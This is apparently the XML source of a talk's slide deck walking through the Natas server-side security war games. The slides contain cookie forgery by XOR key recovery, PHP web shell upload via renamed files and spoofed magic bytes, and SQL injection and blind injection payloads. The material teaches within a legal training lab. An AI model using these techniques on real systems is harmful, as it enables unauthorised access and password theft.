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ndenHill-title">
      <style:graphic-properties draw:auto-grow-height="true" fo:min-height="3.506cm"/>
    </style:style>
    <style:style style:name="pr2" style:family="presentation" style:parent-style-name="LindenHill-subtitle">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="12.18cm"/>
    </style:style>
    <style:style style:name="pr3" style:family="presentation" style:parent-style-name="LindenHill-notes">
      <style:graphic-properties draw:fill-color="#ffffff" draw:auto-grow-height="true" fo:min-height="12.572cm"/>
    </style:style>
    <style:style style:name="pr4" style:family="presentation" style:parent-style-name="LindenHill-outline1">
      <style:graphic-properties fo:min-height="11.93cm"/>
    </style:style>
    <style:style style:name="pr5" style:family="presentation" style:parent-style-name="LindenHill-notes">
      <style:graphic-properties draw:fill-color="#ffffff" fo:min-height="12.572cm"/>
    </style:style>
    <style:style style:name="pr6" style:family="presentation" style:parent-style-name="LindenHill-title">
      <style:graphic-properties fo:min-height="3.506cm"/>
    </style:style>
    <style:style style:name="pr7" style:family="presentation" style:parent-style-name="LindenHill-outline1" style:list-style-name="L3">
      <style:graphic-properties fo:min-height="11.93cm"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed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Linden Hill'" style:font-pitch="variable"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0.5cm" fo:margin-bottom="0.5cm"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="0.4cm" fo:margin-bottom="0.4cm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top="0cm" fo:margin-bottom="0cm"/>
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed" fo:font-size="24pt" style:font-size-asian="24pt" style:font-size-complex="24pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#008000" fo:font-family="'Courier Prime'" style:font-pitch="fixed" fo:font-size="28pt" style:font-size-asian="28pt" style:font-size-complex="28pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-family="'Courier Prime'" style:font-pitch="fixed" fo:font-size="20pt" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-family="'Courier Prime'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Courier Prime'" style:font-pitch="fixed" fo:font-size="32pt" style:font-size-asian="32pt" style:font-size-complex="32pt"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-family="'Linden Hill'" style:font-pitch="variable" fo:font-size="32pt" style:font-size-asian="32pt" style:font-size-complex="32pt"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:font-family="'Linden Hill'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Courier Prime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ndenHill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-side security war games</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:layer="layout" svg:width="24.639cm" svg:height="12.18cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="subtitle">
          <draw:text-box>
            <text:p>A walkthrough of overthewire.org's Natas war games</text:p>
            <text:p/>
            <text:p/>
            <text:p>Mike Doherty / @mikedoherty_c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ndenHill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Can everyone hear?</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id2" text:id="id2">Don't wait to ask your question, please interrupt immediately</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id3" text:id="id3">overthewire.org has several war games</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id4" text:id="id4">Natas is server-side security</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id5" text:id="id5">Starts off very slow, and the difficulty is not monotonically increasing</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id6" text:id="id6">No debriefing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8</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="26.2cm" svg:height="15.286cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p><text:span text:style-name="T1">&lt;?</text:span></text:p>
            <text:p><text:span text:style-name="T1">$encodedSecret = "3d3d516343746d4d6d6c315669563362";</text:span></text:p>
            <text:p><text:span text:style-name="T1">function encodeSecret($secret) {</text:span></text:p>
            <text:p><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">return bin2hex(strrev(base64_encode($secret)));</text:span></text:p>
            <text:p><text:span text:style-name="T1">}</text:span></text:p>
            <text:p><text:span text:style-name="T1">if(array_key_exists("submit", $_POST)) {</text:span></text:p>
            <text:p><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">if(encodeSecret($_POST['secret']) == $encodedSecret) {</text:span></text:p>
            <text:p><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">print "Access granted. The password for natas9 is &lt;censored&gt;";</text:span></text:p>
            <text:p><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">} else {</text:span></text:p>
            <text:p><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">print "Wrong secret";</text:span></text:p>
            <text:p><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">}</text:span></text:p>
            <text:p><text:span text:style-name="T1">}</text:span></text:p>
            <text:p><text:span text:style-name="T1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ndenHill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8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 xml:id="id7" text:id="id7">Forward:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id8" text:id="id8"><text:span text:style-name="T1">base64_encode</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id9" text:id="id9"><text:span text:style-name="T1">strrev</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id10" text:id="id10"><text:span text:style-name="T1">bin2hex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4.914cm" presentation:class="outline">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id11" text:id="id11">Reverse:</text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id12" text:id="id12"><text:span text:style-name="T1">hex2bin</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id13" text:id="id13"><text:span text:style-name="T1">strrev</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id14" text:id="id14"><text:span text:style-name="T1">base64_decod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ndenHill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vel 11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5" text:id="id15">Big jump in difficulty for no apparent reason</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id16" text:id="id16">First clue is: “xor encryption” is not encryption</text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id17" text:id="id17"><text:span text:style-name="T1">plaintext XOR key <text:s text:c="7"/>= ciphertext</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id18" text:id="id18"><text:span text:style-name="T3">plaintext XOR ciphertext = ke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1</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="25.8cm" svg:height="15.686cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">$ php -a</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">Interactive shell</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; function xor_encrypt($in) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>$text = $in;</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>$key = json_encode(array(</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php ( <text:s text:c="8"/>"showpassword" =&gt; "no",</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php ( <text:s text:c="8"/>"bgcolor" =&gt; "#ffffff",</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php ( <text:s text:c="4"/>));</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>$out_text = '';</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>for($i=0; $i&lt;strlen($text); $i++) { // foreach char</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="8"/>$out_text .= $text[$i] ^ $key[$i % strlen($key)];</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>}</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>return $out_text;</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { }</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; $orig_cookie = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw');</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; print xor_encrypt($orig_cookie) . "\n";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq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1</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="25.8cm" svg:height="15.486cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">$ php -a</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">Interactive shell</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; function xor_encrypt($text) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">php { <text:s text:c="4"/>$key = "qw8J";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>$keylen = strlen($key);</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>$out_text = '';</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>for($i=0; $i&lt;strlen($text); $i++) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="8"/>$out_text .= $text[$i] ^ $key[$i % $keylen];</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>}</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { <text:s text:c="4"/>return $out_text;</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php { }</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; $text = json_encode(array(</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">php ( <text:s text:c="4"/>"showpassword" =&gt; "yes",</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php ( <text:s text:c="4"/>"bgcolor" =&gt; "#ffffff"</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php ( ));</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1">php &gt; print base64_encode(xor_encrypt($text)) . "\n";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2">ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFM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2</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr7" draw:text-style-name="P4" draw:layer="layout" svg:width="26.2cm" svg:height="14.886cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L3">
              <text:list-item>
                <text:p xml:id="id19" text:id="id19" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">Original file containing our PHP code. The server calls this </text:span><text:span text:style-name="T1">randomString.jpg</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id20" text:id="id20" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">Change the filename to </text:span><text:span text:style-name="T1">shell.php</text:span><text:span text:style-name="T4"> before it reaches the server</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id21" text:id="id21" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">Server receives the file</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id22" text:id="id22" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T1">MakeRandomPathFromFilename("upload", "shell.php");</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id23" text:id="id23" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T1">$ext = '.php';</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id24" text:id="id24" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T1">MakeRandomPath("upload", "php");</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id25" text:id="id25" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">returns </text:span><text:span text:style-name="T1">"upload/new_random_string.php"</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id26" text:id="id26" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">Link to that file is provided to us.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id27" text:id="id27" text:style-name="P3"><text:span text:style-name="T4"><text:s/></text:span><text:span text:style-name="T4">When we visit that link, Apache will see .php and execute it for us. How helpful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3</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P5" draw:layer="layout" svg:width="26cm" svg:height="14.086cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p xml:id="id28" text:id="id28" text:style-name="P2"><text:span text:style-name="T5">if (! </text:span><text:span text:style-name="T6">exif_imagetype</text:span><text:span text:style-name="T5">($_FILES['uploadedfile']['tmp_name'])) {</text:span></text:p>
            <text:p xml:id="id29" text:id="id29" text:style-name="P2"><text:span text:style-name="T5"><text:s text:c="4"/></text:span><text:span text:style-name="T5">echo "File is not an image";</text:span></text:p>
            <text:p xml:id="id30" text:id="id30" text:style-name="P2"><text:span text:style-name="T5">}</text:span></text:p>
            <text:list text:style-name="L2">
              <text:list-header>
                <text:p><text:span text:style-name="T7"/></text:p>
              </text:list-header>
              <text:list-item>
                <text:p xml:id="id31" text:id="id31"><text:span text:style-name="T8">exif_imagetype() reads </text:span><text:span text:style-name="T9">the first bytes</text:span><text:span text:style-name="T8"> of an image and checks its signature.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id32" text:id="id32"><text:span text:style-name="T8">These are the so-called “magic” bytes for many kinds of multimedia files, including images.</text:span></text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id33" text:id="id33"><text:span text:style-name="T8">Select whichever magic bytes you like from </text:span><text:span text:style-name="T8"><text:a xlink:href="http://www.astro.keele.ac.uk/oldusers/rno/Computing/File_magic.html" xlink:type="simple">http://www.astro.keele.ac.uk/oldusers/rno/Computing/File_magic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4</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="26cm" svg:height="15.486cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">if(array_key_exists("username", $_REQUEST)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">mysql_select_db('natas14', $link);</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query = <text:s/>"SELECT * from users where username=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["username"]."\" and password=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["password"]."\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">if(array_key_exists("debug", $_GET)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Executing query: $query&lt;br&gt;"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if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Successful login! The password for natas15 is...";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">} else {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Access denied!&lt;br&gt;";</text:span></text:p>
            <text:p text:style-name="P2"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4</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="26cm" svg:height="15.486cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">if(array_key_exists("username", $_REQUEST)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">mysql_select_db('natas14', $link);</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">$query = <text:s/>"SELECT * from users where username=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">$query .= $_REQUEST["username"]."\" and password=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">$query .= $_REQUEST["password"]."\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">if(array_key_exists("debug", $_GET)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Executing query: $query&lt;br&gt;"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if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Successful login! The password for natas15 is...";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">} else {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Access denied!&lt;br&gt;";</text:span></text:p>
            <text:p text:style-name="P2"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4</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="26cm" svg:height="15.486cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">if(array_key_exists("username", $_REQUEST)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">mysql_select_db('natas14', $link);</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query = <text:s/>"SELECT * from users where username=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["username"]."\" and password=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["password"]."\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">if(array_key_exists("debug", $_GET)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="8"/></text:span><text:span text:style-name="T2">echo "Executing query: $query&lt;br&gt;";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">}</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Successful login! The password for natas15 is...";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">} else {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Access denied!&lt;br&gt;";</text:span></text:p>
            <text:p text:style-name="P2"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4</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:text-style-name="P1" draw:layer="layout" svg:width="26cm" svg:height="15.486cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:p text:style-name="P2"><text:span text:style-name="T1">if(array_key_exists("username", $_REQUEST)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$link = mysql_connect('localhost', 'natas14', '&lt;censored&gt;');</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">mysql_select_db('natas14', $link);</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query = <text:s/>"SELECT * from users where username=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["username"]."\" and password=\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">$query .= $_REQUEST["password"]."\"";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"/></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">if(array_key_exists("debug", $_GET)) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Executing query: $query&lt;br&gt;"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2"><text:s text:c="4"/></text:span><text:span text:style-name="T2">if(mysql_num_rows(mysql_query($query, $link)) &gt; 0) {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Successful login! The password for natas15 is...";</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">} else {</text:span></text:p>
            <text:p text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="8"/></text:span><text:span text:style-name="T1">echo "Access denied!&lt;br&gt;";</text:span></text:p>
            <text:p text:style-name="P2"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4</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="26cm" svg:height="14.286cm" svg:x="1.4cm" svg:y="4.914cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L2">
              <text:list-item>
                <text:p xml:id="id34" text:id="id34">If you control the contents of <text:span text:style-name="T1">$_REQUEST</text:span><text:span text:style-name="T4">, then</text:span></text:p>
              </text:list-item>
            </text:list>
            <text:p xml:id="id35" text:id="id35" text:style-name="P2"><text:span text:style-name="T1">SELECT * from users where</text:span></text:p>
            <text:p xml:id="id36" text:id="id36" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">username=”%s”</text:span></text:p>
            <text:p xml:id="id37" text:id="id37" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">and password=”%s”</text:span></text:p>
            <text:p xml:id="id38" text:id="id38" text:style-name="P6"><text:span text:style-name="T4">becomes</text:span></text:p>
            <text:p xml:id="id39" text:id="id39" text:style-name="P2"><text:span text:style-name="T1">SELECT * from users where</text:span></text:p>
            <text:p xml:id="id40" text:id="id40" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">username=”natas14”</text:span></text:p>
            <text:p xml:id="id41" text:id="id41" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">or username not null; -- </text:span></text:p>
            <text:p xml:id="id42" text:id="id42" text:style-name="P2"><text:span text:style-name="T1"><text:s text:c="4"/></text:span><text:span text:style-name="T1">and password=”pwnd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5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 xml:id="id43" text:id="id43">We know the table has columns “username” and “password”</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id44" text:id="id44">This code checks if the username exists</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id45" text:id="id45">We probably want the password for the row where username=natas16, so check if that user exists</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id46" text:id="id46">No way to simply print out the password that I can see</text:p>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id47" text:id="id47">But, we can still guess, and check our guess</text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id48" text:id="id48">Timing (use <text:span text:style-name="T1">IF</text:span> and <text:span text:style-name="T1">BENCHMARK</text:span> to make true/false into fast/slow)</text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id49" text:id="id49">Check password more direct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5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 xml:id="id50" text:id="id50">To guess the password's length:</text:p>
                <text:list>
                  <text:list-header>
                    <text:p xml:id="id51" text:id="id51"><text:span text:style-name="T1">natas16" and length(password) = %d #</text:span></text:p>
                  </text:list-header>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id52" text:id="id52"><text:span text:style-name="T4">We already know that the first part of this OR is true, so the truth of the whole thing now depends on the truth of the second part</text:span></text:p>
                <text:list>
                  <text:list-item>
                    <text:p xml:id="id53" text:id="id53"><text:span text:style-name="T4">True: “This user exists”</text:span></text:p>
                  </text:list-item>
                  <text:list-item>
                    <text:p xml:id="id54" text:id="id54"><text:span text:style-name="T4">False: “This user doesn't exist”</text:span></text:p>
                  </text:list-item>
                </text:list>
              </text:list-item>
              <text:list-item>
                <text:p xml:id="id55" text:id="id55"><text:span text:style-name="T4">Iterate </text:span><text:span text:style-name="T1">%d</text:span><text:span text:style-name="T4"> until you get a true respon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5</text:p>
          </draw:text-box>
        </draw:frame>
